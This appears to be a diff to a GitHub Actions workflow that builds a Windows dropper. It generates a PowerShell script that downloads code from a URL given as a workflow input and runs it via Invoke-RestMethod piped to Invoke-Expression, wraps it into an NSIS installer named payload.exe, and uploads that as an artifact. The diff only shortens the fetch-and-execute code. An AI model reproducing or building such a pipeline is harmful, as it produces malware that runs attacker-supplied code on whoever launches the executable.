@@ -24,27 +24,14 @@ jobs:
       shell: powershell
       run: |
         $payloadUrl = "${{ github.event.inputs.payload_url }}"
-        $scriptContent = @"
-        function Fetch-Execute {
-            param ([string]`$url)
-            try {
-                `$response = Invoke-RestMethod -Uri `$url
-                Invoke-Expression `$response
-            } catch {
-                Write-Host `"Error: Cannot fetch or execute script.`"
-            }
-        }
-        Fetch-Execute -url `"$payloadUrl`"
-        "@
+        $scriptContent = "Invoke-RestMethod -Uri `"$payloadUrl`" | Invoke-Expression"
         $scriptContent | Set-Content -Path "script.ps1" -Encoding UTF8
 
     - name: Generate NSIS Script
       shell: powershell
       run: |
         $nsisScript = @"
-        !define OUTPUT "payload.exe"
-
-        Outfile "${OUTPUT}"
+        Outfile "payload.exe"
 
         Section
           SetOutPath `$PLUGINSDIR
@@ -63,5 +50,6 @@ jobs:
       with:
         name: payload_exe
         path: payload.exe
+
 
 
